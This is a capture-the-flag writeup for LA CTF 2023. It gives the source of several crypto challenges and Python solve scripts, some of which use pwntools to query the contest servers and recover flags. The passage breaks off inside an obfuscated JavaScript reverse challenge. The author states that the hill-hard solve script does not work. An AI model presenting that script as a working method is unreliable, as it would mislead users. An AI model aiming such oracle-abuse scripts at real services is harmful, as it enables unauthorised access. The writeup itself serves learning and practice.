---
title: LA CTF 2023 Writeup
category: [Writeup, Contests] 
tags: [ctf]
---
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<script> 
MathJax = {
  tex: {
    inlineMath: [['$', '$']],
    processEscapes: true
  }
};
</script>
# LA CTF 2023 Writeup

## Crypto

### one-more-time-pad

#### Challenge:
```py
from itertools import cycle
pt = b"Long ago, the four nations lived together in harmony ..."

key = cycle(b"lactf{??????????????}")

ct = ""

for i in range(len(pt)):
    b = (pt[i] ^ next(key))
    ct += f'{b:02x}'
print("ct =", ct)

#ct = 200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e
```

#### Solution:
```py
c = bytes.fromhex('200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e')
m = b"Long ago, the four nations lived together in harmony ..."
k = bytes([x^y for x,y in zip(c,m)])
print(k)
```

```plaintext
b'lactf{b4by_h1t_m3_0ne_m0r3_t1m3}lactf{b4by_h1t_m3_0ne_m0'
```

### rolling in the mud

#### Challenge:
![rolling in the mud.png](https://github.com/uclaacm/lactf-archive/blob/master/2023/crypto/rolling-in-the-mud/cipher.png)
#### Solution:
Roll the picture by 180 degree and read by the rule of [pigpen cipher](https://en.wikipedia.org/wiki/Pigpen_cipher)
```plaintext
lactf{rolling_and_rolling_and_rolling_until_the_pigs_go_home}
```
### chinese-lazy-theorem-1
#### Challenge:
```py
#!/usr/local/bin/python3

from Crypto.Util.number import getPrime
from Crypto.Random.random import randint

p = getPrime(512)
q = getPrime(512)
n = p*q

target = randint(1, n)

used_oracle = False

print(p)
print(q)

print("To quote Pete Bancini, \"I'm tired.\"")
print("I'll answer one modulus question, that's it.")
while True:
    print("What do you want?")
    print("1: Ask for a modulus")
    print("2: Guess my number")
    print("3: Exit")
    response = input(">> ")

    if response == "1":
        if used_oracle:
            print("too lazy")
            print()
        else:
            modulus = input("Type your modulus here: ")
            modulus = int(modulus)
            if modulus <= 0:
                print("something positive pls")
                print()
            else:
                used_oracle = True
                print(target%modulus)
                print()
    elif response == "2":
        guess = input("Type your guess here: ")
        if int(guess) == target:
            with open("flag.txt", "r") as f:
                print(f.readline())
        else:
            print("nope")
        exit()
    else:
        print("bye")
        exit()
```
#### Solution:
Use modules == n to query.
```plaintext
lactf{too_lazy_to_bound_the_modulus}
```
### chinese-lazy-theorem-2
#### Challenge:
```py
#!/usr/local/bin/python3

from Crypto.Util.number import getPrime
from Crypto.Random.random import randint

p = getPrime(512)
q = getPrime(512)
n = p*q*2*3*5

target = randint(1, n)

oracle_uses = 0

print(p)
print(q)

print("This time I'll answer 2 modulus questions and give you 30 guesses.")
while True:
    print("What do you want?")
    print("1: Ask for a modulus")
    print("2: Guess my number")
    print("3: Exit")
    response = input(">> ")

    if response == "1":
        if oracle_uses == 2:
            print("too lazy")
            print()
        else:
            modulus = input("Type your modulus here: ")
            modulus = int(modulus)
            if modulus <= 0:
                print("something positive pls")
                print()
            elif modulus > max(p, q):
                print("something smaller pls")
                print()
            else:
                oracle_uses += 1
                print(target%modulus)
                print()
    elif response == "2":
        for _ in range(30):
            guess = input("Type your guess here: ")
            if int(guess) == target:
                with open("flag.txt", "r") as f:
                    print(f.readline())
                    exit()
            else:
                print("nope")
        exit()
    else:
        print("bye")
        exit()
```
#### Solution:
Use [CRT](https://en.wikipedia.org/wiki/Chinese_remainder_theorem) to get target % pq, and guess at most 30 times to get the flag.
```py
from pwn import *
from sympy.ntheory.modular import crt
from tqdm import trange
r = remote('lac.tf',31111)
# r = process(['python','chinese-lazy-theorem-2.py'])

p = int(r.recvline().decode())
q = int(r.recvline().decode())

r.recvuntil(b'>> ')
r.sendline(b'1')
r.recvuntil(b"Type your modulus here: ")
r.sendline(str(p).encode())
x = int(r.recvline().decode())

r.recvuntil(b'>> ')
r.sendline(b'1')
r.recvuntil(b"Type your modulus here: ")
r.sendline(str(q).encode())
y = int(r.recvline().decode())

t,n = crt([p,q],[x,y])
r.recvuntil(b'>> ')
r.sendline(b'2')
try:
	for i in trange(30):
		r.recvuntil(b'Type your guess here: ')
		r.sendline(str(t+i*n).encode())
except:
	r.interactive()

# lactf{n0t_$o_l@a@AzY_aNYm0Re}
```

### greek cipher
#### Challenge:
`κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ'ι ργσκ ιηγτ. οσμιδ{ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ'ι_θιπψ_ωπν._λγοο_ψοσωγκ_ς_τνθι_θσω.μπζερσιθ!}`
#### Solution:
First map greek letters into English letters. Any mapping relation is avaliable.

(remember to map `σ` and `ς` into different letters)
```py
mp={'Α':'A','α':'a','Ν':'N','ν':'n','Β':'B','β':'b','Ξ':'F','ξ':'f','Γ':'G','γ':'g','Ο':'O','ο':'o','Δ':'D','δ':'d','Π':'J','π':'j','Ε':'E','ε':'e','Ρ':'P','ρ':'p','Ζ':'Z','ζ':'z','Σ':'S','σ':'s','ς':'v','Η':'H','η':'h','Τ':'T','τ':'t','Θ':'Q','θ':'q','Υ':'Y','υ':'y','Ι':'I','ι':'i','Φ':'R','φ':'r','Κ':'K','κ':'k','Χ':'X','χ':'x','Λ':'L','λ':'l','Ψ':'C','ψ':'c','Μ':'M','μ':'m','Ω':'W','ω':'w'}
cipher = """κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ'ι ργσκ ιηγτ. οσμιδ{ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ'ι_θιπψ_ωπν._λγοο_ψοσωγκ_ς_τνθι_θσω.μπζερσιθ!}"""
c = ''.join(mp[i] if i in mp else i for i in cipher)
print(c)
```
```plaintext
kvk wjn azjl ihsi xnovnq msgqsp lsq zji ihg dvpqi cgpqjz vz hvqijpw qnqcgmigk jd nqvze gzmpwcivjz? tg zgvihgp. kvk wjn azjl ihsi xnovnq msgqsp lsq cpjfsfow dongzi vz epgga? tg zgvihgp. v ovag hjl epgga mhspsmigp ojja ihjneh, gygz vd v msz'i pgsk ihgt. osmid{v_engqq_nqvze_tszw_epgga_mhspsmigpq_kvkz'i_qijc_wjn._lgoo_coswgk_v_tnqi_qsw.mjzepsiq!}
```
Then use [quipqiup](http://quipqiup.com/) to solve the `monoalpha` part:

`did you know that julius caesar was not the first person in history suspected of using encryption? me neither. did you know that julius caesar was probably fluent in greek? me neither. i like how greek character look though, even if i can't read them. lactf{i_guess_using_many_greek_characters_didn't_stop_you._well_played_i_must_say.congrats!}`

### guess-the-bit!
#### Challenge:
```py
#!/usr/local/bin/python3

import random
from Crypto.Util.number import getPrime

n = 43799663339063312211273714468571591746940179019655418145595314556164983756585900662541462573429625012257141409310387298658375836921310691578072985664621716240663221443527506757539532339372290041884633435626429390371850645743643273836882575180662344402698999778971350763364891217650903860191529913028504029597794358613653479290767790778510701279503128925407744958108039428298936189375732992781717888915493080336718221632665984609704015735266455668556495869437668868103607888809570667555794011994982530936046877122373871458757189204379101886886020141036227219889443327932080080504040633414853351599120601270071913534530651

a = 6

print("n = ", n)
print("a = ", 6)

for i in range(150):
    bit = random.randrange(0,2)
    c = random.randrange(0, n)
    c = c**2
    if bit == 1:
        c *= a
    print("c = ", c)
    guess = int(input("What is your guess? "))
    if guess != bit:
        print("Better luck next time!")
        exit()


print("Congrats! Here's your flag: ")
flag = open("flag.txt", "r").readline().strip()
print(flag)
exit(0)
```
#### Solution:
If `bit == 0`, there must be even multiples of `6` in factorization of `c`,

if `bit == 1`, there must be odd multiples of `6` in factorization of `c`.
```py
from pwn import *
p = remote('lac.tf',31190)
n = int(p.recvline().decode().split(' = ')[-1])
a = int(p.recvline().decode().split(' = ')[-1])
for i in range(150):
	c = int(p.recvline().decode().split(' = ')[-1])
	p.recvuntil(b'What is your guess? ')
	cnt = 0
	while c % 6 == 0:
		cnt += 1
		c //= 6
	if cnt % 2 == 0:
		p.sendline(b'0')
	else:
		p.sendline(b'1')
p.interactive()
# lactf{sm4ll_pla1nt3xt_sp4ac3s_ar3n't_al4ways_e4sy}
```
### ravin-cryptosystem
#### Challenge:
```py
from Crypto.Util import number

def fastpow(b, p, mod):
    # idk this is like repeated squaring or something i heard it makes pow faster
    a = 1
    while p:
        p >>= 1
        b = (b*b)%mod
        if p&1:
            a = (a*b)%mod
    return a

p = number.getPrime(100)
q = number.getPrime(100)
n = p*q
e = 65537
m = int.from_bytes(open("flag.txt", "r").readline().strip().encode(), 'big')
assert(m < n)
c = fastpow(m, e, n)

print("n =", n)
print("e =", e)
print("c =", c)
# n = 996905207436360486995498787817606430974884117659908727125853
# e = 65537
# c = 375444934674551374382922129125976726571564022585495344128269
```
#### Solution:
The error in `fastpow` is that the `if` statement should come before `p >>= 1;b = (b*b)%mod`. The actual effect of `fastpow` is:

$$ \text{fastpow}(b,p,mod)=\left\{\begin{matrix}
 b^p \% mod & \text{p is even} \\
 b^{p-1} \% mod & \text{p is odd}
\end{matrix}\right. $$

So here `c==m^65536 % mod`.

However, if you try to `d=pow(65536,-1,(p-1)*(q-1))`, it will tell you `inverse not exists`. That's because `gcd(65536,(p-1)*(q-1))!=1`.

Notice that `65536==2^16`(also with the hint of title`ravin-cryptosystem`), we can use the [rabin algorithm](https://en.wikipedia.org/wiki/Rabin_cryptosystem#Decryption) 16 times to reveal `m`.
```py
from libnum import *
from gmpy2 import *
n = 996905207436360486995498787817606430974884117659908727125853
e = 65537 - 1
c = 375444934674551374382922129125976726571564022585495344128269
p = 861346721469213227608792923571
q = 1157379696919172022755244871343
phi = (p-1)*(q-1)
_,yp,yq = gcdext(p,q)
def rabin(c):
    mp = pow(c,(p+1)//4,p)
    mq = pow(c,(q+1)//4,q)
    a = (yp*p*mq + yq*q*mp)%n
    # b = n - a
    # c = (yp*p*mq - yq*q*mp)%n
    # d = n - c
    return a
for i in range(16):
    c = rabin(c)
print(n2s(int(c)))
# lactf{g@rbl3d_r6v1ng5}
```
### hill-easy
#### Challenge:
```py
#!/usr/local/bin/python3

import numpy as np

def det(M):
    # stolen from https://stackoverflow.com/a/66192895
    M = [[int(x) for x in row] for row in M] # make a copy to keep original M unmodified
    N, sign, prev = len(M), 1, 1
    for i in range(N-1):
        if M[i][i] == 0: # swap with another row having nonzero i's elem
            swapto = next( (j for j in range(i+1,N) if M[j][i] != 0), None )
            if swapto is None:
                return 0 # all M[*][i] are zero => zero determinant
            M[i], M[swapto], sign = M[swapto], M[i], -sign
        for j in range(i+1,N):
            for k in range(i+1,N):
                assert ( M[j][k] * M[i][i] - M[j][i] * M[i][k] ) % prev == 0
                M[j][k] = ( M[j][k] * M[i][i] - M[j][i] * M[i][k] ) // prev
        prev = M[i][i]
    return sign * M[-1][-1]

n = 20
A = np.random.randint(0, 95, [n, n])
while np.gcd(det(A), 95) != 1:
    # ensures invertibility
    A = np.random.randint(0, 95, [n, n])

def stov(s):
    return np.array([ord(c)-32 for c in s])

def vtos(v):
    return ''.join([chr(v[i]+32) for i in range(n)])

def encrypt(s):
    return vtos(np.matmul(A, stov(s))%95)

fakeflag = "lactf{" + ''.join([chr(ord('a')+np.random.randint(0,26)) for _ in range(33)]) + "}"
fakeflag2 = "lactf{" + ''.join([chr(ord('a')+np.random.randint(0,26)) for _ in range(33)]) + "}"
assert(len(fakeflag) == 2*n)
assert(len(fakeflag2) == 2*n)
f1 = encrypt(fakeflag[:n])
f2 = encrypt(fakeflag[n:])
f3 = encrypt(fakeflag2[:n])
f4 = encrypt(fakeflag2[n:])

def giveflag():
    flag = open("flag.txt", "r").readline().strip()
    print("\nThe text on the stone begins to rearrange itself into another message:")
    print(flag)
    exit(0)

def oracle(guess):
    o1 = encrypt(guess[:n])
    o2 = encrypt(guess[n:])
    if o1 == f1 and o2 == f2:
        giveflag()
    print("Incorrect:")
    print(o1)
    print(o2)

def trydecode():
    guess = input("\nEnter your guess: ")
    if len(guess) != 40:
        return 1
    for c in guess:
        if ord(c) < 32 or ord(c) >= 127:
            return 2
    
    oracle(guess)
    return 0

def guess(num):
    while (err := trydecode()) != 0:
        if err == 1:
            print("Your guess must be exactly 40 characters.")
        elif err == 2:
            print("Your guess must use only ASCII characters")
    
    print("You have", 9-num, "attempts left")

print("On the hill lies a stone. It reads:")
print(f1)
print(f2)
print("\nA mysterious figure offers you 10 attempts at decoding the stone:")
for i in range(10):
    guess(i)
print("\nThe figure frowns, and turns to leave. In desperation, you beg for one more chance. The figure ponders, then reluctantly agrees to offer you an alternative task.")
print("Create a new stone that decodes to the following:")
print(fakeflag2)
guess1 = input("\nEnter the first half: ")
guess2 = input("\nEnter the second half: ")
if guess1 == f3 and guess2 == f4:
    giveflag()
else:
    print("Nope.")
```
#### Solution:
Notice that `' '`(`chr(32)`) becomes `0` after passing `stov()`,
we can construct a string with `' '`s and only one `chr(33)` in each half, so

$$
\begin{bmatrix}
  a_{11}& a_{12} &\dots  & a_{1n}\\
  a_{21}& a_{22} &\dots & a_{2n}\\
  a_{31}& a_{32} &\dots & a_{3n}\\
 \vdots  &  \vdots&  \ddots & \vdots\\
  a_{n1}& a_{n2} &\dots & a_{nn}
\end{bmatrix}
\begin{bmatrix}
 0\\
 \vdots\\
 x_j=1\\
 \vdots\\
 0
\end{bmatrix}=
\begin{bmatrix}
 a_{1j}\\
 a_{2j}\\
 a_{3j}\\
 \vdots\\
 a_{nj}
\end{bmatrix}
$$

In each query, we can reveal two columns of `A`, so in 10 queries, we can reveal all data in `A`. Then you can just use `A` to encrypt `fakeflag2` and get the flag.

```py
#!/usr/local/bin/python3

import numpy as np

n = 20

A = np.matrix([[0 for i in range(n)] for i in range(n)])

def stov(s):
    return np.array([ord(c)-32 for c in s])

def vtos(v):
    return ''.join([chr(v[0,i]+32) for i in range(n)])

def encrypt(s):
    return vtos(np.matmul(A, stov(s))%95)

from pwn import *
# context(log_level='debug')

r = remote('lac.tf',31140)
# r = process(['python','chall.py'])

r.recvuntil(b'On the hill lies a stone. It reads:\n')
r.recvline()
r.recvline()
r.recvuntil(b'\nA mysterious figure offers you 10 attempts at decoding the stone:')
for i in range(10):
    r.sendline(b' '*i+b'!'+b' '*(19-i)+b' '*(i+10)+b'!'+b' '*(9-i))
    r.recvuntil(b'Incorrect:\n')
    r1 = stov(r.recvline().decode().strip('\n'))
    r2 = stov(r.recvline().decode().strip('\n'))
    for j in range(n):
        A[j,i] = r1[j]
        A[j,i+10] = r2[j]

r.recvuntil(b"Create a new stone that decodes to the following:\n")
fakeflag2 = r.recvline().strip().decode()
f3 = encrypt(fakeflag2[:n])
f4 = encrypt(fakeflag2[n:])

r.recvuntil(b'Enter the first half: ')
r.sendline(f3.encode())
r.recvuntil(b'Enter the second half: ')
r.sendline(f4.encode())

r.interactive()

# lactf{tHeY_SaiD_l!NaLg_wOuLD_bE_fUN_115}
```
### hill-hard
**Notice: I didn't solve this challenge, this is just a record and summary**
#### Challenge:
```py
#!/usr/local/bin/python3

import numpy as np

def det(M):
    # stolen from https://stackoverflow.com/a/66192895
    M = [[int(x) for x in row] for row in M] # make a copy to keep original M unmodified
    N, sign, prev = len(M), 1, 1
    for i in range(N-1):
        if M[i][i] == 0: # swap with another row having nonzero i's elem
            swapto = next( (j for j in range(i+1,N) if M[j][i] != 0), None )
            if swapto is None:
                return 0 # all M[*][i] are zero => zero determinant
            M[i], M[swapto], sign = M[swapto], M[i], -sign
        for j in range(i+1,N):
            for k in range(i+1,N):
                assert ( M[j][k] * M[i][i] - M[j][i] * M[i][k] ) % prev == 0
                M[j][k] = ( M[j][k] * M[i][i] - M[j][i] * M[i][k] ) // prev
        prev = M[i][i]
    return sign * M[-1][-1]

n = 20
A = np.random.randint(0, 95, [n, n])
while np.gcd(det(A), 95) != 1:
    # ensures invertibility
    A = np.random.randint(0, 95, [n, n])

def stov(s):
    return np.array([ord(c)-32 for c in s])

def vtos(v):
    return ''.join([chr(v[i]+32) for i in range(n)])

def encrypt(s):
    return vtos(np.matmul(A, stov(s))%95)

fakeflag = "lactf{" + ''.join([chr(ord('a')+np.random.randint(0,26)) for _ in range(13)]) + "}"
fakeflag2 = "lactf{" + ''.join([chr(ord('a')+np.random.randint(0,26)) for _ in range(13)]) + "}"
assert(len(fakeflag) == n)
assert(len(fakeflag2) == n)
f = encrypt(fakeflag)
f2 = encrypt(fakeflag2)

def xorencrypt(s):
    v1 = stov(s)
    v2 = stov(fakeflag)
    v = np.bitwise_xor(v1, v2)
    return encrypt(vtos(v))

def giveflag():
    flag = open("flag.txt", "r").readline().strip()
    print("\nYour vision fades to black, and arcane symbols begin to swarm your mind. To others, it might seem like magic, but you can see what others cannot.")
    print(flag)
    exit(0)

def oracle(guess):
    print(xorencrypt(guess))

def trydecode():
    guess = input("\nEnter your guess: ")
    if len(guess) != 20:
        return 1
    for c in guess:
        if ord(c) < 32 or ord(c) >= 127:
            return 2
        if c == ' ':
            return 3
    
    oracle(guess)
    return 0

def guess(num):
    while (err := trydecode()) != 0:
        if err == 1:
            print("Your guess must be exactly 20 characters.")
        elif err == 2:
            print("Your guess must use only ASCII characters")
        elif err == 3:
            print("Sorry, spaces aren't allowed anymore.")
    
    print("You have", 13-num, "attempts left")

print("On the hill lies a stone. It reads:")
print(f)
print("\nA mysterious figure offers you 14 uses of an oracle:")
for i in range(14):
    guess(i)

print("\nThe figure vanishes, leaving only a vague message. Encrypt me:")
print(fakeflag2)
guess = input("\nEnter your guess: ")
if guess == f2:
    giveflag()
else:
    print("Nope.")
```
#### Solution:
In this challenge, spaces are banned. Also, a `bitwise_xor` is introduced before encryption.

Noticing the fakeflag has the format of `lactf{[a-z]{13}}`, we can use the same format to xor some columns of `s` in matrix multiplication.

However, with the spaces being banned, we cannot reveal the value of `A` like before. So we tried to use `'\x60'` and put one `'\x61'` in different places in each queries.(We will explain why that character later).

First use `'\x60'*13` to query and receive `base`, then use `'\x60'*i+'\x61'+'\x60'*(12-i)` for `i`th query and receive `res[i]`, when we minus `res[i]` by `base`:

$$
\begin{array}{l}
\text{res[i]}-\text{base}\\
= \left ( 32+\displaystyle\sum_{k=1}^{n} a_{jk}\left [(\text{fakeflag[j]-32})\oplus(\text{payload[j]}-32)\right]\right )_{n\times 1}\\
-\left ( 32+\displaystyle\sum_{k=1}^{n} a_{jk}\left [(\text{fakeflag[j]-32})\oplus(\text{0x60}-32)\right]\right )_{n\times 1}\\
=\left ( a_{ji}\left [(\text{fakeflag[j]-32}) \oplus\text{0x41} - (\text{fakeflag[j]-32}) \oplus\text{0x40} \right ] \right )_{n\times 1}
\end{array}
$$

since all characters in `fakeflag`$\in$ $\left(\text{0x60},\text{0x7f}\right)$,
meaning $\forall x \in \text{fakeflag}, x-32 \in \left(\text{0x40},\text{0x5f}\right)$.

With a simple python snippet, we can discover that:
```py
for i in range(0x40,0x5f):
    print((i^0x41)-(i^0x40),end=' ')
```
```plaintext
1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1 -1 1
```
the absolute value of all numbers is 1.

So by adding an absolute value:

$$\left | \text{res[i]}-\text{base}\right |=\left ( a_{ji}\right )_{n\times 1}$$

By doing this, we can reveal 13 colmuns of `A` in 14 queries.

However, to encrypt `fakeflag2`, we also need the remaining columns of `A`.

A natural idea is to calculate the differences between `f`(encryption of `fakeflag`) and `base`.

What we need, in theory, is the contribution of the remaining columns of `A` to `fakeflag2`. Let's denote it by $\Delta y$.

$$\begin{array}{l}
\Delta y_i&= \sum_{i=0}^{5}a_{ij}\text{fakeflag2[j]}+ a_{in}\text{fakeflag2[n]}\\
&=a_{i0}\times \left ( \text{ord('l')}-32 \right ) \\
&+a_{i1}\times \left ( \text{ord('a')}-32 \right ) \\
&+a_{i2}\times \left ( \text{ord('c')}-32 \right ) \\
&+a_{i3}\times \left ( \text{ord('t')}-32 \right ) \\
&+a_{i4}\times \left ( \text{ord('f')}-32 \right ) \\
&+a_{i5}\times \left ( \text{ord('\{')}-32 \right ) \\
&+a_{in}\times \left ( \text{ord('\}')}-32 \right ) \\
\end{array}$$

(the index maybe a little confusing, but as long as you know what we are talking)

So

$$\begin{array}{l}
f_i-\text{base}_i \\= \sum_{j=0}^{n}a_{ij}\left ( \text{fakeflag[j]}-32  \right )
-\displaystyle\sum_{j=6}^{n-1}a_{ij}\left [ \left ( \text{fakeflag[j]}-32 \right )\oplus \left ( \text{0x60} -32 \right )\right]\\
=\displaystyle\sum_{j=0}^{n}a_{ij}\left ( \text{fakeflag[j]}-32  \right )
-\displaystyle\sum_{j=6}^{n-1}a_{ij}\left [ \left ( \text{fakeflag[j]}-32 \right )\oplus\text{0x40}\right ]\\
=\Delta y_i +\displaystyle\sum_{j=6}^{n-1}a_{ij}\left [ \left ( \text{fakeflag[j]}-32 \right )-\left \{  \left ( \text{fakeflag[j]}-32 \right )\oplus\text{0x40} \right \}\right ]
\end{array}$$

because $\forall x \in \text{fakeflag}, x-32 \in (\text{0x40},\text{0x5f})$, so $[( \text{fakeflag[j]}-32)-\{( \text{fakeflag[j]}-32 )\oplus\text{0x40}\}]=\text{0x40}$.

we can verify that with a small python snippet:
```py
for ff in range(0x40,0x5f):
    print(ff-(ff^0x40),end=' ')
```
```
64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64
```
So

$$\begin{array}{l}
f_i-\text{base}_i =\Delta y_i + 64 \times \displaystyle\sum_{j=6}^{n-1}a_{ij}\\
\Delta y_i = f_i-\text{base}_i - 64 \times \displaystyle\sum_{j=6}^{n-1}a_{ij}
\end{array}$$

(all operations done in mod 95)

So I wrote such a exploit script:

```py
import numpy as np
n = 20
A = np.zeros((n,n),dtype=np.uint32)
def stov(s):
    return np.array([ord(c)-32 for c in s])
def vtos(v):
    return ''.join([chr(v[i]+32) for i in range(n)])
def encrypt(s):
    return vtos(np.matmul(A, stov(s))%95)
from pwn import *
# r = remote('lac.tf',31141)
r = process(['python','chall.py'])
r.recvuntil(b'On the hill lies a stone. It reads:\n')
f = r.recvline().decode().strip('\n')
f = stov(f)
r.recvuntil(b"\nA mysterious figure offers you 14 uses of an oracle:\n")
r.recvuntil(b'Enter your guess: ')
payload = 'lactf{' + '\x60'*13 + '}'
r.sendline(payload.encode())
base = r.recvline().decode().strip('\n')
base = stov(base)
res = [None]*13
for i in range(13):
    r.recvuntil(b'Enter your guess: ')
    payload = 'lactf{' + '\x60'*i + '\x61' + '\x60'*(12-i) + '}'
    r.sendline(payload.encode())
    res[i] = stov(r.recvline().decode().strip('\n'))
    res[i] = [abs(res[i][j]-base[j]) for j in range(n)]
    for j in range(n):
        A[j,i+6] = res[i][j]
dy = np.array([(f[i] - base[i] - 64 * sum(A[i,j] for j in range(6,19)))%95 for i in range(20)])
r.recvuntil(b"\nThe figure vanishes, leaving only a vague message. Encrypt me:\n")
fakeflag2 = r.recvline().strip().decode()
r.recvuntil(b'\nEnter your guess: ')
f2 = encrypt(fakeflag2)
f2 = vtos((stov(f2)+dy)%95)
r.sendline(f2.encode())
r.interactive()
```
However, it's just **not working**!!!
I don't know why, but **if anyone has any idea, please comment below to let me know**.

*P.S: I have read the author's writeup, but it sucks and I can't understand what he is writing*.

## Reverse

### caterpillar
#### Challenge:
```js
const flag = "lactf{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}";
if (flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == 